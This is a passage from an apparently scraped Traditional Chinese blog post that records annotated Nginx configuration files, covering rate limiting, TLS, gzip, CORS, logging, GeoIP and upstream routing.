to_nodejs2; } default.conf ## module: ngx_http_limit_req_module ## 限制請求處理 ## limit_req_zone key zone=name:size rate=rate [sync]; 定義限制請求的規則 limit_req_zone $binary_remote_addr$server_name zone=websocket:10m rate=1r/m; ## limit_req_status code; 設定被拒絕連線的 HTTP 狀態碼，預設為 503 limit_req_status 502; ## 設定虛擬主機 server { ## listen port [default_server] [ssl] [http2 | spdy] [proxy_protocol] [setfib=number] [fastopen=number] [backlog=number] [rcvbuf=size] [sndbuf=size] [accept_filter=filter] [deferred] [bind] [ipv6only=on|off] [reuseport] [so_keepalive=on|off|[keepidle]:[keepintvl]:[keepcnt]]; ## 設定監聽的埠口，預設為 *:80 ## 下方設定為監聽 80 port，且為預設的虛擬主機 listen 80 default_server; ## server_name name ...; 設定虛擬主機名，可使用正則表示式，預設為 \u0026#34;\u0026#34; server_name _; access_log logs/default/default.log json; error_log logs/default/default.error.log warn; ## module: ngx_http_access_module ## allow address | CIDR | unix: | all; 允許 IP 訪問 allow 1.1.1.1; ## deny address | CIDR | unix: | all; 禁止 IP 訪問 deny 12.34.56.78; ## 設定請求訪問的根資料夾 root /usr/share/nginx/html; ## limit_req zone=name [burst=number] [nodelay | delay=number]; 設定限制請求的規則 zone limit_req zone=websocket nodelay; ## limit_req_log_level info | notice | warn | error; 設定被拒絕連線的請求日誌等級，預設為 error limit_req_log_level warn; ## location [ = | ~ | ~* | ^~ ] uri { ... } ## location @name { ... } 依據請求的 URI 配置 location / { default_type application/json; ## 返回 HTTP 狀態碼 200，並包含字串 return 200 \u0026#39;{\u0026#34;Code\u0026#34;: \u0026#34;$status\u0026#34;, \u0026#34;IP\u0026#34;: \u0026#34;$remote_addr\u0026#34;}\u0026#39;; } } server { ## 下方設定為監聽 443 port，且為預設的虛擬主機，所有連線都使用 SSL listen 443 default_server ssl; server_name _; access_log logs/default/default.log json; error_log logs/default/default.error.log warn; ## module: ngx_http_ssl_module ## 設定 PEM 格式的證書 ssl_certificate /etc/ssl/hddv1.com.crt; ## 設定 PEM 格式的密鑰 ssl_certificate_key /etc/ssl/hddv1.com.key; ## 設定 SSL 版本，預設為 TLSv1 TLSv1.1 TLSv1.2 ssl_protocols TLSv1.2 TLSv1.3; ## 設定啟用的加密方法，預設為 HIGH:!aNULL:!MD5 ssl_ciphers \u0026#34;EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EECDH+aRSA+SHA256:EECDH+aRSA+RC4:EECDH:EDH+aRSA:HIGH:!RC2:!RC4:!aNULL:!eNULL:!LOW:!IDEA:!DES:!TDES:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!EXPORT:!ANON\u0026#34;; ## 為 DHE 加密法指定帶有 DH 參數的文件 ssl_dhparam /etc/ssl/dhparams.pem; ## 是否優先使用 server 的加密法，預設為 off ssl_prefer_server_ciphers on; ## ssl_session_cache off | none | [builtin[:size]] [shared:name:size]; ## 設定緩存及大小，預設為 none ssl_session_cache shared:SSL:1m; ## 設定 session 可重複使用的時間，預設為 5 分鐘 ssl_session_timeout 5m; add_header X-Frame-Options \u0026#34;SAMEORIGIN\u0026#34;; add_header X-XSS-Protection \u0026#34;1; mode=block\u0026#34;; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubdomains; preload\u0026#34;; root /usr/share/nginx/html; limit_req zone=websocket nodelay; limit_req_log_level warn; default_type application/json; location / { default_type application/json; return 200 \u0026#39;{\u0026#34;Code\u0026#34;: \u0026#34;$status\u0026#34;, \u0026#34;IP\u0026#34;: \u0026#34;$remote_addr\u0026#34;}\u0026#39;; } } nginx.conf ## module: ngx_core_module ## worker_processes number | auto; 啟動 Nginx worker 程序數量, 設定 auto 即和 CPU 的數量相等 worker_processes auto; ## worker_rlimit_nofile number; Nginx worker 程序最大打開文件數，預設為系統 RLIMIT_NOFILE worker_rlimit_nofile 131072; ## worker_shutdown_timeout time; 設定關閉超時時間，當執行 reload 或是其他相關指令，超過 time 時間之後，Nginx 會主動關閉所有受影響的 worker worker_shutdown_timeout 60; ## error_log file [level]; 設定錯誤日誌寫入位置 ## debug, info, notice, warn, error, crit, alert, emerg error_log logs/error.log warn; ## pid file; 主程序 ID 文件位置 pid logs/nginx.pid; ## module: ngx_core_module ## 設定連線處理相關 events { ## worker_connections number; 單個 Nginx worker 程序的最大並發連接數，預設為 512，需要小於 worker_rlimit_nofile ## 最大連接數 = worker_connections * worker_processes worker_connections 102400; ## accept_mutex on | off; 預設為 off ## 只有一個新連線進入，如果設定為 on，只有一個 worker 會接受連線，其餘持續休眠 ## 如果設定為 off，所有 worker 會被喚醒，只有一個 worker 會接受連線，其餘重新休眠 ## 業務上使用 TCP 長連線、流量大，off 的效能以及 QPS 表現較佳 accept_mutex off; ## multi_accept on | off; 是否同時接受所有的請求，預設為 off multi_accept on; } ## module: ngx_http_core_module ## 設定 HTTP server 相關 http { ## module: ngx_core_module ## include file | mask; 使用文件中的設定 ## 下方為設定 MIME 類型,類型由 mime.type 文件定義 include mime.types; ## default_type mime-type; 定義默認 MIME 類型，預設為 text/plain default_type application/octet-stream; ## server_names_hash_max_size size; 設定 server_name 的 hash 表最大值，預設為 512 kb server_names_hash_max_size 2048; ## 設定 server_name 的 hash 表的大小，用於快速找到對應的 server_name，預設值取決於 CPU 的 L1 cache server_names_hash_bucket_size 256; ## server_tokens on | off | build | string; 是否在 Nginx 錯誤頁面顯示 Nginx 版本，預設為 on server_tokens off; ## 是否在錯誤日誌記錄 404 log_not_found off; ## 是否啟用 sendfile() 提高文件傳輸效率，預設為 off sendfile on; ## 文件是否使用完整封包發送，預設為 off tcp_nopush on; ## 數據是否儘快傳送，預設為 on tcp_nodelay on; ## 設定長連線持續秒數，超過時間 Nginx 會主動關閉連線，預設為 75 keepalive_timeout 70; ## client_max_body_size size; 設定請求允許最大的 body 大小 client_max_body_size 64M; ## module: ngx_http_gzip_module ## 是否啟用 gzip 壓縮，預設為 off gzip on; ## 設定要壓縮的 Content-Length 最小值，預設為 20 gzip_min_length 1k; ## 設定壓縮緩衝大小，預設為一頁記憶體 ## gzip_buffers number size; gzip_buffers 4 32k; ## 設定壓縮等級，範圍 1 ~ 9，預設為 1 gzip_comp_level 7; ## 設定要壓縮的 MIME 類型，預設為 text/html gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/x-httpd-php application/json; ## 是否在 HTTP response header 增加 Vary: Accept-Encoding，預設為 off gzip_vary on; ## 針對特定 User-Agent 禁用壓縮 ## 下方為設定禁用 IE 6 gzip_disable \u0026#34;MSIE [1-6]\\.\u0026#34;; ## resolver address ... [valid=time] [ipv6=on|off] [status_zone=zone]; 使用指定的 NS 解析 server_name, upstream server 等 resolver 114.114.114.114 8.8.8.8 1.1.1.1; ## module: ngx_http_headers_module ## add_header name value [always]; 在 HTTP response header 增加欄位 ## 下方為設定允許跨域 add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Headers DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type; add_header Access-Control-Allow-Methods GET,POST,OPTIONS; add_header Access-Control-Expose-Headers \u0026#39;WWW-Authenticate,Server-Authorization,User-Identity-Token\u0026#39;; ## module: ngx_http_realip_module ## set_real_ip_from address | CIDR | unix:; 設定信任的可被替代的伺服器 IP，如反向代理伺服器 set_real_ip_from 10.0.0.0/8; set_real_ip_from 172.16.0.0/12; set_real_ip_from 192.168.0.0/16; ## real_ip_header field | X-Real-IP | X-Forwarded-For | proxy_protocol; 定義使用哪個標頭取代獲取到的 client IP，預設為 X-Real-IP real_ip_header X-Forwarded-For; ## 將 real_ip_header 設定的標頭中，「最後一個非信任伺服器 IP」或是「最後一個 IP」當成真實 IP，預設為 off real_ip_recursive on; ## module: ngx_http_log_module ## log_format name [escape=default|json|none] string ...; 設定日誌格式 log_format json escape=json \u0026#39;{\u0026#34;@timestamp\u0026#34;:\u0026#34;$time_iso8601\u0026#34;,\u0026#39; \u0026#39;\u0026#34;@source\u0026#34;:\u0026#34;$server_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;ip\u0026#34;:\u0026#34;$http_x_forwarded_for\u0026#34;,\u0026#39; \u0026#39;\u0026#34;client\u0026#34;:\u0026#34;$remote_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;request_method\u0026#34;:\u0026#34;$request_method\u0026#34;,\u0026#39; \u0026#39;\u0026#34;scheme\u0026#34;:\u0026#34;$scheme\u0026#34;,\u0026#39; \u0026#39;\u0026#34;domain\u0026#34;:\u0026#34;$server_name\u0026#34;,\u0026#39; \u0026#39;\u0026#34;client_host\u0026#34;:\u0026#34;$host\u0026#34;,\u0026#39; \u0026#39;\u0026#34;referer\u0026#34;:\u0026#34;$http_referer\u0026#34;,\u0026#39; \u0026#39;\u0026#34;request\u0026#34;:\u0026#34;$request_uri\u0026#34;,\u0026#39; \u0026#39;\u0026#34;args\u0026#34;:\u0026#34;$args\u0026#34;,\u0026#39; \u0026#39;\u0026#34;sent_bytes\u0026#34;:$body_bytes_sent,\u0026#39; \u0026#39;\u0026#34;status\u0026#34;:$status,\u0026#39; \u0026#39;\u0026#34;responsetime\u0026#34;:$request_time,\u0026#39; \u0026#39;\u0026#34;upstreamtime\u0026#34;:\u0026#34;$upstream_response_time\u0026#34;,\u0026#39; \u0026#39;\u0026#34;upstreamaddr\u0026#34;:\u0026#34;$upstream_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;http_user_agent\u0026#34;:\u0026#34;$http_user_agent\u0026#34;,\u0026#39; \u0026#39;\u0026#34;Country\u0026#34;:\u0026#34;$geoip2_data_country_name\u0026#34;,\u0026#39; \u0026#39;\u0026#34;State\u0026#34;:\u0026#34;$geoip2_data_state_name\u0026#34;,\u0026#39; \u0026#39;\u0026#34;City\u0026#34;:\u0026#34;$geoip2_data_city_name\u0026#34;,\u0026#39; \u0026#39;\u0026#34;all_agent\u0026#34;:\u0026#34;$arg_agent\u0026#34;,\u0026#39; \u0026#39;\u0026#34;dfw_agent\u0026#34;:\u0026#34;$arg_proxy\u0026#34;,\u0026#39; \u0026#39;\u0026#34;nw2_agent\u0026#34;:\u0026#34;$arg_channel\u0026#34;,\u0026#39; \u0026#39;\u0026#34;https\u0026#34;:\u0026#34;$https\u0026#34;\u0026#39; \u0026#39;}\u0026#39;; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; ## access_log path [format [buffer=size] [gzip[=level]] [flush=time] [if=condition]]; 設定日誌寫入位置以及使用的日誌名稱 ## access_log off; 不紀錄日誌 access_log logs/access.log json; } ","date":"November 19, 2021","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211119-nginx/","summary":"\u003ch1 id=\"紀錄-nginx-設定檔及說明\"\u003e紀錄 Nginx 設定檔及說明\u003c/h1\u003e\n\u003ch2 id=\"檔案結構\"\u003e檔案結構\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── geoip.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── sites-available\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e│   ├── default.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── sites-enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e│   ├── default.conf -\u0026gt; ../sites-available/default.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── upstream.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"geoipconf\"\u003egeoip.conf\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_geoip2_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## https://github.com/leev/ngx_http_geoip2_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 讀取 GeoIP 資料庫，並進行變數設定\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003egeoip2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/usr/share/GeoIP/GeoLite2-Country.mmdb\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eauto_reload\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e$geoip2_metadata_country_build\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emetadata\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ebuild_epoch\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 自定義 $geoip2_data_country_code 值為 $remote_addr 對應的 ISO 3116 規範的國碼\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003e$geoip2_data_country_code\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003esource=\u003c/span\u003e$remote_addr \u003cspan style=\"color:#e6db74\"\u003ecountry\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eiso_code\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 自定義 $geoip2_data_country_name 值為對應的英文城市名\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003e$geoip2_data_country_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ecountry\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enames\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003een\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upstreamconf\"\u003eupstream.conf\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_upstream_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 定義 server 組別\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eupstream\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## server address [parameters]; 定義 server\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## parameters:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## weight=number 定義權重，預設為 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## max_fails=number 設定到 upstream server 的最大重試次數，預設為 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## fail_timeout=time 設定到達 max_fails 次數之後，暫停向此 upstream server 傳送請求的時間，預設為 10 秒\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## backup 標記此 upstream server 為備用，當其他 upstream server 不可用時，此 upstream server 可接受請求\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## down 標記此 upstream server 為不可用\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e90\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e91\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ebackup\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eupstream\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs2\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e92\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e93\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ebackup\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eupstream\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs95\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e95\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_map_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## map string $variable { ... } 建立一個新的變數\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e $arg_agent $game_api {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## $arg_agent 請求中 agent 的值(https://abc.com/?agent=123)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## agent=60037, $game_api 的值為 to_nodejs95\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003e60037\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs95\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## agent 結尾是 1, 2, 3, 或是 4, $game_api 的值為 to_nodejs1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003e~*1$\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e~*2$\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e~*3$\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e~*4$\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 若 agent 不符合上開規則，預設 $game_api 的值為 to_nodejs2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003edefault\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs2\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"defaultconf\"\u003edefault.conf\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_limit_req_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 限制請求處理\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## limit_req_zone key zone=name:size rate=rate [sync]; 定義限制請求的規則\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elimit_req_zone\u003c/span\u003e $binary_remote_addr$server_name \u003cspan style=\"color:#e6db74\"\u003ezone=websocket:10m\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003erate=1r/m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## limit_req_status code; 設定被拒絕連線的 HTTP 狀態碼，預設為 503\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elimit_req_status\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e502\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 設定虛擬主機\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## listen port [default_server] [ssl] [http2 | spdy] [proxy_protocol] [setfib=number] [fastopen=number] [backlog=number] [rcvbuf=size] [sndbuf=size] [accept_filter=filter] [deferred] [bind] [ipv6only=on|off] [reuseport] [so_keepalive=on|off|[keepidle]:[keepintvl]:[keepcnt]];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定監聽的埠口，預設為 *:80\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方設定為監聽 80 port，且為預設的虛擬主機\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan 